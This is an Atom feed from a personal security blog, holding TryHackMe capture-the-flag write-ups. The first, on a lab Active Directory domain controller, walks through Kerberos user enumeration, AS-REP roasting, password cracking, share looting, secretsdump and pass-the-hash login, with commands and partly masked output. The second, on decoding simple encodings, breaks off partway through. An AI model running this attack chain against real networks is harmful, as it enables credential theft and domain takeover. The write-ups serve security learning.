@@ -1,0 +1,989 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>Writups - Writups</title>
+    <subtitle>A diary dedicated to exploring the world of cybersecurity and technology.</subtitle>
+    <link href="https://theanxiuser.github.io/writups/categories/writups/atom.xml" rel="self" type="application/atom+xml"/>
+    <link href="https://theanxiuser.github.io/writups"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2024-10-23T00:00:00+00:00</updated>
+    <id>https://theanxiuser.github.io/writups/categories/writups/atom.xml</id>
+    <entry xml:lang="en">
+        <title>Attacktive Directory - TryHackMe Writup</title>
+        <published>2024-10-23T00:00:00+00:00</published>
+        <updated>2024-10-23T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/attacktive-directory/" type="text/html"/>
+        <id>https://theanxiuser.github.io/writups/chapters/attacktive-directory/</id>
+        
+        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
+  &lt;div&gt;
+	&lt;img src=&quot;attacktive_directory.png&quot; alt=&quot;Attacktive Directory&quot; width=&quot;100&quot;&#x2F;&gt;
+  &lt;&#x2F;div&gt;
+  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
+	&lt;i&gt;99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?&lt;&#x2F;i&gt;
+  &lt;&#x2F;div&gt;
+&lt;&#x2F;div&gt;
+&lt;h1 id=&quot;scanning&quot;&gt;Scanning&lt;&#x2F;h1&gt;
+&lt;p&gt;Target IP: 10.10.186.106&lt;&#x2F;p&gt;
+&lt;p&gt;The result of nmap scan is &lt;&#x2F;p&gt;
+&lt;pre&gt;
+&gt; nmap -sV 110.10.186.106 -v
+......
+Host is up (0.17s latency).
+Not shown: 986 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+53&#x2F;tcp   open  domain        Simple DNS Plus
+80&#x2F;tcp   open  http          Microsoft IIS httpd 10.0
+88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-16 15:07:06Z)
+135&#x2F;tcp  open  msrpc         Microsoft Windows RPC
+139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+445&#x2F;tcp  open  microsoft-ds?
+464&#x2F;tcp  open  kpasswd5?
+593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636&#x2F;tcp  open  tcpwrapped
+3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3269&#x2F;tcp open  tcpwrapped
+3389&#x2F;tcp open  ms-wbt-server Microsoft Terminal Services
+5985&#x2F;tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)
+Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;code&gt;enum4linux&lt;&#x2F;code&gt; is used for the enumeration of port 139&#x2F;445&lt;&#x2F;p&gt;
+&lt;p&gt;The result is&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ enum4linux -a 10.10.186.106
+Starting enum4linux v0.9.1 ( http:&#x2F;&#x2F;labs.portcullis.co.uk&#x2F;application&#x2F;enum4linux&#x2F; ) on Thu Oct 17 07:48:03 2024
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.186.106
+RID Range ........ 500-550,1000-1050
+Username ......... &#x27;&#x27;
+Password ......... &#x27;&#x27;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===========================( Enumerating Workgroup&#x2F;Domain on 10.10.186.106 )===========================
+.....
+[E] Can&#x27;t find workgroup&#x2F;domain
+
+ ===============================( Nbtstat Information for 10.10.186.106 )===============================
+
+Can&#x27;t load &#x2F;etc&#x2F;samba&#x2F;smb.conf - run testparm to debug it
+Looking up status of 10.10.186.106
+No reply from 10.10.186.106
+
+ ===================================( Session Check on 10.10.186.106 )===================================
+
+
+[+] Server 10.10.186.106 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;
+
+
+ ================================( Getting domain SID for 10.10.186.106 )================================
+
+Can&#x27;t load &#x2F;etc&#x2F;samba&#x2F;smb.conf - run testparm to debug it
+Domain Name: THM-AD
+Domain Sid: S-1-5-21-3591857110-2884097990-301047963
+
+[+] Host is part of a domain (not a workgroup)
+......
+ =================================( Share Enumeration on 10.10.186.106 )=================================
+
+Can&#x27;t load &#x2F;etc&#x2F;samba&#x2F;smb.conf - run testparm to debug it
+
+	Sharename       Type      Comment
+	---------       ----      -------
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on 10.10.186.106
+......
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Here we got the NETBIOS domain name. Also &lt;code&gt;.local&lt;&#x2F;code&gt; is the invalid TLD most of the people use for AD,. The same is shown in this case too.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;enumerating-users-via-kerberos&quot;&gt;Enumerating Users via Kerberos&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;code&gt;kerbrute&lt;&#x2F;code&gt; tool is used here. &lt;code&gt;userenum&lt;&#x2F;code&gt; is used to enumerate username. To run the command we need to setup domain name, so append this line in &lt;code&gt;&#x2F;etc&#x2F;hosts&lt;&#x2F;code&gt;. Userlist should be the provided one.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;10.10.186.106 spookysec.local&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Now runnning the command &lt;code&gt;kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt&lt;&#x2F;code&gt; we are getting valid usernames. The answer are already there.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;abusing-kerberos&quot;&gt;Abusing Kerberos&lt;&#x2F;h2&gt;
+&lt;p&gt;The two account here mentioned are already found in above task. The result of above command for one of them is like 
+&lt;code&gt;2024&#x2F;10&#x2F;17 08:12:33 &amp;gt;  [+] svc-***** has no pre auth required. Dumping hash to crack offline:&lt;&#x2F;code&gt; and this is the answer we need.&lt;&#x2F;p&gt;
+&lt;p&gt;Now running &lt;code&gt;GetNPUsers.py&lt;&#x2F;code&gt; tool of impacket to reterive information about the user. This is TGT, and this is already we have. The result is like&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ &#x2F;opt&#x2F;impacket&#x2F;examples&#x2F;GetNPUsers.py spookysec.local&#x2F;svc-admin
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+[*] Cannot authenticate svc-admin, getting its TGT
+&#x2F;opt&#x2F;impacket&#x2F;examples&#x2F;GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+$krb5asrep$23$svc-*****@SPOOKYSEC.LOCAL:279edbdaf153fbd3c5e418fd97266821$3efe8c8212644d80f88de5f5e93b09ff8834c57ff88fcbc77d7f50a67073623623c247fe17c9d90.......
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Locking into the hash, we got name and mode. The mode is needed to crack the hash using &lt;code&gt;hashcat&lt;&#x2F;code&gt; but for &lt;code&gt;john&lt;&#x2F;code&gt; mode is not needed. In this case we are using john.&lt;&#x2F;p&gt;
+&lt;p&gt;Here we got the password as&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ john svc-admin.hash --wordlist=passwordlist.txt
+.....
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+mana**********   ($krb5asrep$23$svc-*****@SPOOKYSEC.LOCAL)
+1g 0:00:00:00 DONE (2024-10-17 08:33) 2.325g&#x2F;s 16669p&#x2F;s 16669c&#x2F;s 16669C&#x2F;s horoscope..frida
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;back-to-the-basics&quot;&gt;Back to the Basics&lt;&#x2F;h2&gt;
+&lt;p&gt;Here we got the shares&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ smbclient -L 10.10.186.106 --user svc-*****
+Can&#x27;t load &#x2F;etc&#x2F;samba&#x2F;smb.conf - run testparm to debug it
+Password for [WORKGROUP\svc-admin]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	backup          Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now connecting with backup share. We got something special. Download and acess this file as&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ smbclient \\\\10.10.186.106\\backup --user svc-***** --password mana**********
+Can&#x27;t load &#x2F;etc&#x2F;samba&#x2F;smb.conf - run testparm to debug it
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Apr  5 00:53:39 2020
+  ..                                  D        0  Sun Apr  5 00:53:39 2020
+  backup_credentials.txt              A       48  Sun Apr  5 00:53:53 2020
+
+		8247551 blocks of size 4096. 3631513 blocks available
+smb: \&gt; get backup_credentials.txt
+getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes&#x2F;sec) (average 0.1 KiloBytes&#x2F;sec)
+&lt;&#x2F;pre&gt;
+&lt;p&gt;There is a cipher. THis is encoded into base 64, decoding it.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ base64 -d backup_credentials.txt
+backup@spookysec.local:backu******** 
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;elevating-privileges-within-the-domain&quot;&gt;Elevating Privileges within the Domain&lt;&#x2F;h2&gt;
+&lt;p&gt;We are using &lt;code&gt;secretsdump.py&lt;&#x2F;code&gt; here and the above domain controller. Password is required and this is already with us by decoding above cipher.&lt;&#x2F;p&gt;
+&lt;p&gt;The command to run is &lt;code&gt;.&#x2F;secretsdump.py -just-dc backup@spookysec.local&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Now we have all the answer to the question mentioned here. Also there is a method of attack called &lt;code&gt;Pass The Hash&lt;&#x2F;code&gt;, which allow us to authenticate as user without password and we have all the hashes so good to go.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;flag-submission-panel&quot;&gt;Flag Submission Panel&lt;&#x2F;h2&gt;
+&lt;p&gt;Now need to logged in using hash for different user, mentioned there to get and submit flag using tool &lt;code&gt;Evil-WinRM&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;User to try are &lt;code&gt;svc-admin&lt;&#x2F;code&gt;, &lt;code&gt;backup&lt;&#x2F;code&gt; and &lt;code&gt;Administrator&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;We are connected via Administrator using &lt;code&gt;evil-winrm -i 10.10.186.106 -u Administrator -H 0e0363213e37b9**********b0bcb4fc&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The flags are as &lt;&#x2F;p&gt;
+&lt;pre&gt;
+*Evil-WinRM* PS C:\Users\svc-admin\Desktop&gt; cat user.txt.txt
+TryHackMe{K3rb3r0**********}
+
+*Evil-WinRM* PS C:\Users\backup\Desktop&gt; cat PrivEsc.txt
+TryHackMe{B4ckM**********}
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
+TryHackMe{4ctiveD1rec**********}
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now we have completed the task, this was the hacking of domain controller.&lt;&#x2F;p&gt;
+&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>c4ptur3-th3-fl4g - TryHackMe Writup</title>
+        <published>2024-10-23T00:00:00+00:00</published>
+        <updated>2024-10-23T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/c4ptur3-th3-fl4g/" type="text/html"/>
+        <id>https://theanxiuser.github.io/writups/chapters/c4ptur3-th3-fl4g/</id>
+        
+        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
+  &lt;div&gt;
+    &lt;img src=&quot;ctf.png&quot; alt=&quot;c4ptur3-th3-fl4g&quot; width=&quot;100&quot;&#x2F;&gt;
+  &lt;&#x2F;div&gt;
+  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
+    &lt;i&gt;A beginner level CTF challenge&lt;&#x2F;i&gt;
+  &lt;&#x2F;div&gt;
+&lt;&#x2F;div&gt;
+&lt;h2 id=&quot;task-1-translation-and-shifting&quot;&gt;Task 1. Translation and Shifting&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;1-c4n-y0u-c4p7u23-7h3-f149&quot;&gt;1. c4n y0u c4p7u23 7h3 f149?&lt;&#x2F;h3&gt;
+&lt;p&gt;This is just translation, 4=a, 0=o, 7=t, 2=r, 3=e, 1=l.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;2-01101100-01100101-01110100-01110011-00100000-01110100-01110010-01111001-00100000-01110011-01101111-01101101-01100101-00100000-01100010-01101001-01101110-01100001-01110010-01111001-00100000-01101111-01110101-01110100-00100001&quot;&gt;2. 01101100 01100101 01110100 01110011 00100000 01110100 01110010 01111001 00100000 01110011 01101111 01101101 01100101 00100000 01100010 01101001 01101110 01100001 01110010 01111001 00100000 01101111 01110101 01110100 00100001&lt;&#x2F;h3&gt;
+&lt;p&gt;Here given is the combination of 1 byte, ie 8 bit. First need to convert this bytes into ASCII, and then corresponding characters.&lt;&#x2F;p&gt;
+&lt;p&gt;Can be used this site to convert &lt;code&gt;https:&#x2F;&#x2F;www.rapidtables.com&#x2F;convert&#x2F;number&#x2F;binary-to-ascii.html&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;3-mjqxgzjtgiqgs4zaon2xazlsebrw63lnn5xca2loebbvirrhom&quot;&gt;3. MJQXGZJTGIQGS4ZAON2XAZLSEBRW63LNN5XCA2LOEBBVIRRHOM======&lt;&#x2F;h3&gt;
+&lt;p&gt;This is in base32 form so need to decode into normal form. Can be used &lt;code&gt;https:&#x2F;&#x2F;www.dcode.fr&#x2F;base-32-encoding&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;4-rwfjacbcyxnlnjqgzglnaxqgcmvwcmvzzw50cyblegfjdgx5idygyml0cybvzibkyxrhlg&quot;&gt;4. RWFjaCBCYXNlNjQgZGlnaXQgcmVwcmVzZW50cyBleGFjdGx5IDYgYml0cyBvZiBkYXRhLg==&lt;&#x2F;h3&gt;
+&lt;p&gt;This is base64 encoded string, need to decode maybe using this site &lt;code&gt;https:&#x2F;&#x2F;www.base64decode.org&#x2F;&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;5-68-65-78-61-64-65-63-69-6d-61-6c-20-6f-72-20-62-61-73-65-31-36-3f&quot;&gt;5. 68 65 78 61 64 65 63 69 6d 61 6c 20 6f 72 20 62 61 73 65 31 36 3f&lt;&#x2F;h3&gt;
+&lt;p&gt;This is in hexadecimal format. Need to convert hex to ascii character, can be use this site &lt;code&gt;https:&#x2F;&#x2F;www.rapidtables.com&#x2F;convert&#x2F;number&#x2F;hex-to-ascii.html&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;6-ebgngr-zr-13-cynprf&quot;&gt;6. Ebgngr zr 13 cynprf!&lt;&#x2F;h3&gt;
+&lt;p&gt;This is in ratation form, Rot13. Can be used this site for decoding &lt;code&gt;https:&#x2F;&#x2F;cryptii.com&#x2F;pipes&#x2F;rot13-decoder&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;7-f-da-6-c-89e-c-f-5-323j-c-89e-c-f-5-wcf-e-6dx&quot;&gt;7. *@F DA:? &amp;gt;6 C:89E C@F?5 323J C:89E C@F?5 Wcf E:&amp;gt;6DX&lt;&#x2F;h3&gt;
+&lt;p&gt;This is in rot 47 format. Use this site &lt;code&gt;https:&#x2F;&#x2F;www.dcode.fr&#x2F;rot-47-cipher&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;8&quot;&gt;8. - . .-.. . -.-. --- -- -- ..- -. .. -.-. .- - .. --- -.&lt;&#x2F;h3&gt;
+&lt;h3 id=&quot;&quot;&gt;. -. -.-. --- -.. .. -. --.&lt;&#x2F;h3&gt;
+&lt;p&gt;This is the morse coding. Use &lt;code&gt;https:&#x2F;&#x2F;morsecode.world&#x2F;international&#x2F;translator.html&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;9-85-110-112-97-99-107-32-116-104-105-115-32-66-67-68&quot;&gt;9. 85 110 112 97 99 107 32 116 104 105 115 32 66 67 68&lt;&#x2F;h3&gt;
+&lt;p&gt;ASCII encoding, from decimal. Use site &lt;code&gt;https:&#x2F;&#x2F;www.coderstool.com&#x2F;decimal-to-ascii&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;10-ls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gli0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gls0tls0gli0tls0gli0tls0gli0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gli0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gli0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gls0tls0gli0tls0gli0tls0gli0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gli0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gls0tls0gli0tls0gli0tls0gli0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gli0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gls0tls0gli0tls0gli0tls0gli0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gli0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gls0tls0gli0tls0gli0tls0gli0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gli0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gls0tls0gli0tls0gli0tls0gli0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gli0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gli0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gli0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gli0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gls0tls0gli0tls0gli0tls0gli0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gli0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gli0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gls0tls0gli0tls0gli0tls0gli0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gls0tls0gli0tls0gli0tls0gli0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gli0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gls0tls0gli0tls0gli0tls0gli0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gls0tls0gli0tls0gli0tls0gli0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gli0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gli0tls0kls0tls0gls0tls0gli0tls0gls0tls0gls0tls0gls0tls0gls0tls0gls0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gls0tls0gli0tls0gli0tls0kls0tls0gli0tls0gli0tls0gls0tls0gls0tls0gli0tls0gls0tls0gli0tls0&quot;&gt;10. 